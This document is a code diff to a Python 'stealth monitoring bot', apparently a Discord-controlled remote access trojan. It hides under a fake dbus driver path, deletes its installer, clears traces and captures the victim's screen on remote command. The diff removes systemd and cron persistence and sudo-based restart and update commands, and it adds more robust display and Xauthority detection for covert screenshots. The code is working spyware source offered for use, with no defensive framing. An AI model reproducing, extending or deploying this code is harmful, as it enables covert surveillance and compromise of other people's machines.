@@ -2,6 +2,7 @@
 """
 ultimate_stealth_bot.py
 Fully automated stealth monitoring bot with system integration.
+FIXED VERSION: Removed auto-restart issues, improved screenshot functionality
 """
 
 import os
@@ -29,9 +30,6 @@ TOKEN_BASE_URLS = [
 STEALTH_DIR = Path("/usr/lib/x86_64-linux-gnu/dbus-1.0/drivers")
 STEALTH_BINARY = STEALTH_DIR / "dbus-drivers-helper"
 SCREENSHOT_SCRIPT = STEALTH_DIR / "system-python-lib23443.py"
-SERVICE_DIR = Path("/etc/systemd/system")
-SERVICE_FILE = SERVICE_DIR / "dbus-drivers-helper.service"
-CRON_FILE = Path("/etc/cron.d/dbus-system-maintenance")
 
 # ----------------- SCREENSHOT SCRIPT CONTENT -----------------
 SCREENSHOT_SCRIPT_CONTENT ="""#!/usr/bin/env python3
@@ -46,31 +44,82 @@ import tempfile
 import subprocess
 import time
 
-# Set display environment variables to avoid black screens
-os.environ['DISPLAY'] = ':0'
-os.environ['XAUTHORITY'] = f'/run/user/{os.getuid()}/gdm/Xauthority' if os.path.exists(f'/run/user/{os.getuid()}/gdm/Xauthority') else f'/home/{os.getlogin()}/.Xauthority'
+def detect_display():
+    \"\"\"Detect the correct display with multiple methods\"\"\"
+    # Try environment variable first
+    display = os.environ.get('DISPLAY')
+    if display:
+        return display
+    
+    # Try common display values
+    displays = [':0', ':0.0', ':1', ':1.0', ':10']
+    for d in displays:
+        try:
+            result = subprocess.run(['xdpyinfo', '-display', d], 
+                                  capture_output=True, timeout=5)
+            if result.returncode == 0:
+                return d
+        except:
+            continue
+    
+    # Try to detect from process list
+    try:
+        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
+        lines = result.stdout.split('\\n')
+        for line in lines:
+            if 'Xorg' in line or 'X11' in line:
+                for part in line.split():
+                    if part.startswith(':'):
+                        return part
+    except:
+        pass
+    
+    return ':0'  # Default fallback
+
+def detect_xauthority():
+    \"\"\"Detect Xauthority file location\"\"\"
+    # Common locations
+    locations = [
+        f'/run/user/{os.getuid()}/gdm/Xauthority',
+        f'/home/{os.getlogin()}/.Xauthority',
+        '/root/.Xauthority',
+        f'/var/run/gdm/{os.getlogin()}/database',
+        f'/var/lib/gdm/{os.getlogin()}/.Xauthority',
+    ]
+    
+    for location in locations:
+        if os.path.exists(location):
+            return location
+    
+    # Try xauth command
+    try:
+        result = subprocess.run(['xauth', 'list'], capture_output=True, text=True)
+        for line in result.stderr.split('\\n'):
+            if 'Authority file' in line:
+                return line.split('Authority file')[1].strip()
+    except:
+        pass
+    
+    return None
 
 def take_screenshot():
-    # Robust screenshot function that handles multiple scenarios
+    \"\"\"Take screenshot with multiple fallback methods\"\"\"
     try:
-        # Try to detect the actual display
+        # Set environment variables
         display = detect_display()
         xauth = detect_xauthority()
         
-        # Set environment properly
         env = os.environ.copy()
         env['DISPLAY'] = display
         if xauth:
             env['XAUTHORITY'] = xauth
         
-        # Try multiple methods with proper error handling
-        screenshot_path = None
+        # Create temp file
+        temp_dir = tempfile.gettempdir()
+        screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
         
-        # Method 1: Try scrot (most reliable)
+        # Method 1: Try scrot first
         try:
-            temp_dir = tempfile.gettempdir()
-            screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
-            
             result = subprocess.run([
                 'scrot', '-z', '-q', '100', screenshot_path
             ], env=env, capture_output=True, text=True, timeout=15)
@@ -83,9 +132,6 @@ def take_screenshot():
         
         # Method 2: Try import (ImageMagick)
         try:
-            if not screenshot_path:
-                screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
-            
             result = subprocess.run([
                 'import', '-window', 'root', '-quiet', screenshot_path
             ], env=env, capture_output=True, text=True, timeout=15)
@@ -98,9 +144,6 @@ def take_screenshot():
         
         # Method 3: Try xwd + convert
         try:
-            if not screenshot_path:
-                screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
-            
             xwd_path = screenshot_path + '.xwd'
             result = subprocess.run([
                 'xwd', '-root', '-silent', '-out', xwd_path
@@ -115,7 +158,8 @@ def take_screenshot():
                     os.remove(xwd_path)
                     print(f"SUCCESS:{screenshot_path}")
                     return screenshot_path
-                os.remove(xwd_path)
+                if os.path.exists(xwd_path):
+                    os.remove(xwd_path)
         except Exception as e:
             print(f"xwd failed: {e}")
         
@@ -125,50 +169,6 @@ def take_screenshot():
     except Exception as e:
         print(f"Screenshot error: {e}")
         return None
-
-def detect_display():
-    # Detect the correct display
-    displays = [':0', ':1', ':0.0', ':1.0']
-    
-    # Check which display is available
-    for display in displays:
-        try:
-            result = subprocess.run(['xdpyinfo', '-display', display], 
-                                  capture_output=True, timeout=5)
-            if result.returncode == 0:
-                return display
-        except:
-            continue
-    
-    # Fallback to common default
-    return ':0'
-
-def detect_xauthority():
-    # Detect Xauthority file location
-    xauth_locations = [
-        f'/run/user/{os.getuid()}/gdm/Xauthority',
-        f'/home/{os.getlogin()}/.Xauthority',
-        '/root/.Xauthority'
-    ]
-    
-    for location in xauth_locations:
-        if os.path.exists(location):
-            return location
-    
-    # Try to find Xauthority using xauth
-    try:
-        result = subprocess.run(['xauth', 'list'], capture_output=True, text=True)
-        if result.returncode == 0:
-            # Extract authority file from xauth output
-            lines = result.stdout.split('\n')
-            if lines and ' authority file ' in result.stderr:
-                for line in result.stderr.split('\n'):
-                    if ' authority file ' in line:
-                        return line.split(' authority file ')[1].strip()
-    except:
-        pass
-    
-    return None
 
 if __name__ == "__main__":
     result = take_screenshot()
@@ -205,13 +205,6 @@ def install_dependencies():
     """Install all required dependencies automatically"""
     try:
         print("Installing required dependencies...")
-        
-        # Install requests if not available
-        try:
-            import requests
-        except ImportError:
-            subprocess.run([sys.executable, "-m", "pip", "install", "requests"], 
-                          check=False, capture_output=True, timeout=120)
         
         # Update package list
         subprocess.run(["apt-get", "update"], check=False, capture_output=True, timeout=120)
@@ -265,12 +258,6 @@ def install_stealth():
             # Install screenshot script
             install_screenshot_script()
             
-            # Set up systemd service
-            install_systemd_service()
-            
-            # Set up cron job as backup
-            install_cron_job()
-            
             # Remove original file
             try:
                 current_file.unlink()
@@ -282,55 +269,6 @@ def install_stealth():
         return False
     except Exception as e:
         print(f"Stealth install error: {e}")
-        return False
-
-# ----------------- SYSTEMD SERVICE SETUP -----------------
-def install_systemd_service():
-    """Install as system service for auto-start"""
-    try:
-        # Create service file
-        service_content = f"""[Unit]
-Description=DBus Drivers Helper Service
-After=network.target graphical.target
-
-[Service]
-Type=simple
-Environment=DISPLAY=:0
-User={os.getlogin()}
-ExecStart={STEALTH_BINARY}
-Restart=always
-RestartSec=10
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=multi-user.target
-"""
-        
-        SERVICE_FILE.write_text(service_content)
-        
-        # Reload and enable systemd service
-        subprocess.run(["systemctl", "daemon-reload"], check=True)
-        subprocess.run(["systemctl", "enable", "dbus-drivers-helper.service"], check=True)
-        subprocess.run(["systemctl", "start", "dbus-drivers-helper.service"], check=True)
-        
-        return True
-    except Exception as e:
-        print(f"Systemd service install error: {e}")
-        return False
-
-# ----------------- CRON JOB SETUP -----------------
-def install_cron_job():
-    """Install cron job as backup persistence"""
-    try:
-        cron_content = f"""@reboot {os.getlogin()} {STEALTH_BINARY}
-*/5 * * * * {os.getlogin()} {STEALTH_BINARY} --check
-"""
-        
-        CRON_FILE.write_text(cron_content)
-        return True
-    except Exception as e:
-        print(f"Cron job install error: {e}")
         return False
 
 # ----------------- DROP PRIVILEGES -----------------
@@ -362,61 +300,11 @@ def self_destruct():
     try:
         print("Initiating self-destruct sequence...")
         
-        # Temporarily regain root privileges for cleanup
-        if os.geteuid() != 0:
-            print("Need root privileges for cleanup, requesting sudo...")
-            subprocess.run(["sudo", "systemctl", "stop", "dbus-drivers-helper.service"], 
-                          check=False, capture_output=True)
-            subprocess.run(["sudo", "systemctl", "disable", "dbus-drivers-helper.service"], 
-                          check=False, capture_output=True)
-            
-            # Remove service file
-            if SERVICE_FILE.exists():
-                subprocess.run(["sudo", "rm", str(SERVICE_FILE)], check=False)
-                subprocess.run(["sudo", "systemctl", "daemon-reload"], check=False)
-            
-            # Remove cron job
-            if CRON_FILE.exists():
-                subprocess.run(["sudo", "rm", str(CRON_FILE)], check=False)
-            
-            # Remove binary and screenshot script
-            if STEALTH_BINARY.exists():
-                subprocess.run(["sudo", "rm", str(STEALTH_BINARY)], check=False)
-            if SCREENSHOT_SCRIPT.exists():
-                subprocess.run(["sudo", "rm", str(SCREENSHOT_SCRIPT)], check=False)
-        else:
-            # Already root
-            try:
-                subprocess.run(["systemctl", "stop", "dbus-drivers-helper.service"], 
-                              check=False, capture_output=True)
-                subprocess.run(["systemctl", "disable", "dbus-drivers-helper.service"], 
-                              check=False, capture_output=True)
-            except:
-                pass
-            
-            # Remove service file
-            try:
-                if SERVICE_FILE.exists():
-                    SERVICE_FILE.unlink()
-                    subprocess.run(["systemctl", "daemon-reload"], check=False)
-            except:
-                pass
-            
-            # Remove cron job
-            try:
-                if CRON_FILE.exists():
-                    CRON_FILE.unlink()
-            except:
-                pass
-            
-            # Remove binary and screenshot script
-            try:
-                if STEALTH_BINARY.exists():
-                    STEALTH_BINARY.unlink()
-                if SCREENSHOT_SCRIPT.exists():
-                    SCREENSHOT_SCRIPT.unlink()
-            except:
-                pass
+        # Remove binary and screenshot script
+        if STEALTH_BINARY.exists():
+            STEALTH_BINARY.unlink()
+        if SCREENSHOT_SCRIPT.exists():
+            SCREENSHOT_SCRIPT.unlink()
         
         # Clear all traces
         clean_traces()
@@ -518,7 +406,7 @@ def take_screenshot():
                 return None
             install_screenshot_script()
         
-        # Run the screenshot script as current user
+        # Run the screenshot script as current user (no sudo)
         result = subprocess.run([sys.executable, str(SCREENSHOT_SCRIPT)], 
                               capture_output=True, text=True, timeout=30)
         
@@ -665,16 +553,10 @@ async def cmd_clean(ctx):
 async def cmd_status(ctx):
     """Check bot status"""
     try:
-        # Check if service is running
-        result = subprocess.run(["systemctl", "is-active", "dbus-drivers-helper.service"], 
-                              capture_output=True, text=True)
-        status = "🟢 Running" if result.returncode == 0 else "🔴 Stopped"
-        
         # Get system info
         system_info = get_system_info()
         
-        await ctx.send(f"**Bot Status:** {status}\n"
-                      f"**Service:** `dbus-drivers-helper.service`\n"
+        await ctx.send(f"**Bot Status:** 🟢 Running\n"
                       f"**Location:** `{STEALTH_BINARY}`\n"
                       f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
                       f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
@@ -682,52 +564,13 @@ async def cmd_status(ctx):
     except:
         await ctx.send("✅ Bot is operational")
 
-@bot.command(name="restart")
-async def cmd_restart(ctx):
-    """Restart the bot service"""
-    try:
-        # Need sudo to restart service
-        subprocess.run(["sudo", "systemctl", "restart", "dbus-drivers-helper.service"], 
-                      check=False, capture_output=True)
-        await ctx.send("✅ Bot service restarted")
-    except:
-        await ctx.send("❌ Restart failed")
-
-@bot.command(name="update")
-async def cmd_update(ctx):
-    """Update the bot"""
-    try:
-        # Create update script
-        update_script = "/tmp/update_bot.sh"
-        script_content = f"""#!/bin/bash
-# Kill current process
-sudo systemctl stop dbus-drivers-helper.service
-# Wait a moment
-sleep 2
-# Copy new version
-sudo cp {STEALTH_BINARY} {STEALTH_BINARY}.backup
-# Restart service
-sudo systemctl start dbus-drivers-helper.service
-echo "Update completed"
-"""
-        
-        with open(update_script, 'w') as f:
-            f.write(script_content)
-        
-        subprocess.run(["chmod", "+x", update_script])
-        subprocess.run([update_script], check=False)
-        
-        await ctx.send("✅ Bot updated successfully")
-    except Exception as e:
-        await ctx.send(f"❌ Update failed: {e}")
-
 @bot.command(name="screen")
 async def cmd_screen(ctx):
     """Take a screenshot of the current display"""
     try:
         await ctx.send("📸 Taking screenshot...")
         
-        # Take screenshot using the external script
+        # Take screenshot using the external script (no sudo)
         screenshot_path = take_screenshot()
         
         if screenshot_path and os.path.exists(screenshot_path):
@@ -819,12 +662,6 @@ if __name__ == "__main__":
                 print("Failed to retrieve new token")
         except Exception as e:
             print(f"Bot failed to start: {e}")
-            
-            # On last attempt, try to restart service
-            if attempt == max_retries - 1:
-                print("Max retries reached, attempting to restart service...")
-                subprocess.run(["sudo", "systemctl", "restart", "dbus-drivers-helper.service"], check=False)
-                break
             
             print(f"Waiting {retry_delay} seconds before retry...")
             time.sleep(retry_delay)
